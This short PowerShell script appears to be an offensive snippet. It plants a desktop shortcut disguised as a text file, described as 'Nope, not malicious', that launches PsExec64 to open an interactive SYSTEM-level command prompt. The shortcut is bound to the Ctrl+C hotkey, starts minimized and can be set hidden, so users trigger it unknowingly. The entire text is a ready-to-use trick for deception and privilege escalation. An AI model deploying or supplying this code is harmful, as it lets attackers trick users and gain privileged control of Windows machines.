$path                      = "$([Environment]::GetFolderPath('Desktop'))\FakeText.lnk"
$wshell                    = New-Object -ComObject Wscript.Shell
$shortcut                  = $wshell.CreateShortcut($path)

$shortcut.IconLocation     = "C:\Windows\System32\shell32.dll,70"

$shortcut.TargetPath       = "cmd.exe"
$shortcut.Arguments        = "/c PSExec64.exe /accepteula -s -i cmd.exe"
$shortcut.WorkingDirectory = "C:"
$shortcut.HotKey           = "CTRL+C"
$shortcut.Description      = "Nope, not malicious"

$shortcut.WindowStyle      = 7
                           # 7 = Minimized window
                           # 3 = Maximized window
                           # 1 = Normal    window
$shortcut.Save()

(Get-Item $path).Attributes += 'Hidden' # Optional if we want to make the link invisible (prevent user clicks)
